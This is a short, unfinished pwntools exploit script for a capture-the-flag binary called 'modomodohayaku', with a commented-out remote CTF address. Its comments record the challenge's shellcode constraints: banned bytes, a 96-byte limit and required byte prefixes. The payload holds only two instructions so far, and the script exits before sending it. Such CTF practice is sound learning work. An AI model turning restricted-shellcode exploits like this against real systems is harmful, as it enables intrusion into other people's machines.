from pwn import *



context.arch = "amd64"
elf=ELF('./pwn/modomodohayaku/modomodohayaku')
r = process('./pwn/modomodohayaku/modomodohayaku')
#r = remote('ctf.adl.tw', 10006)


#buffer has 240 bytes (30 vars*8)
#first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
                            #nop  k      i     r     t    o
#read 96 bytes into buffer
#divide the shellcode into lines of 6
#first 16 lines must start with 0xc 0x87 0x63
#we have to limit the shellcode within 96 bytes

my_movsxd=b'\x63\xc1'#movsxd eax,eax
payload=b''
payload+=asm("or al,0x87")
payload+=my_movsxd


print(disasm(payload))#in intel syntax, e.g. dest=src
exit(0)
output=r.recvuntil(b'..........')
print(output)
pause()
r.send(flat(payload))

r.interactive()

 